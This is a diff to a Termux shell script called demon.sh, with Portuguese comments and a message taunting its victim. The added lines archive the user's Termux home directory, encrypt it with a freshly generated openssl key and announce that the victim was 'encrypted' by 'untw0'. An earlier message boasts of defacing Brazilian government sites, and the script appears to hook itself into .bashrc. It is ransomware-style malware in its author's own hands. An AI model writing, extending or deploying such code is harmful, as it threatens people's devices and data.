@@ -3,6 +3,13 @@
 # Caminho do script
 SCRIPT_PATH="/data/data/com.termux/files/home/demon.sh"
 
+# Diretório onde os dados serão armazenados
+DATA_DIR="/data/data/com.termux/files/home/termux_data"
+ENCRYPTED_DIR="/data/data/com.termux/files/home/termux_data_encrypted"
+BACKUP_FILE="$DATA_DIR/backup.tar.gz"
+ENCRYPTED_FILE="$ENCRYPTED_DIR/backup.tar.gz.enc"
+KEY_FILE="$ENCRYPTED_DIR/encryption_key.key"
+
 # Função para configurar o Termux
 setup_termux() {
     # Verificar se o comando foi adicionado ao .bashrc
@@ -41,7 +48,7 @@ main() {
 EOF
 
     # Mensagem
-    echo "ENTAO QUER DIZER QUE VOCES SAO OS OWNADORES DAS PADOCARIAS .GOV.BR VAO A MERDA, SO DA DEFACE USANDO CLOUD VAZADA! by: untw0"
+    echo "TOMOU UMA CRIPTOGRAFADA INSANA DO UNTW0 KKKKKKKKKKKKKKKKKKKKKKK"
 
     # Simulação de carregamento
     total_steps=20  # Número total de etapas de carregamento
@@ -58,6 +65,22 @@ EOF
     done
     echo "]"
     echo "100%"
+
+    # Coletar dados
+    echo "Coletando dados do Termux..."
+    mkdir -p "$DATA_DIR"
+    mkdir -p "$ENCRYPTED_DIR"
+    tar -czf "$BACKUP_FILE" /data/data/com.termux/files/home
+
+    # Gerar uma chave de criptografia
+    openssl rand -base64 32 > "$KEY_FILE"
+
+    # Criptografar o backup
+    echo "Criptografando os dados..."
+    openssl enc -aes-256-cbc -salt -in "$BACKUP_FILE" -out "$ENCRYPTED_FILE" -pass file:"$KEY_FILE"
+
+    # Limpar o backup não criptografado
+    rm "$BACKUP_FILE"
 
     # Configurar o Termux
     setup_termux
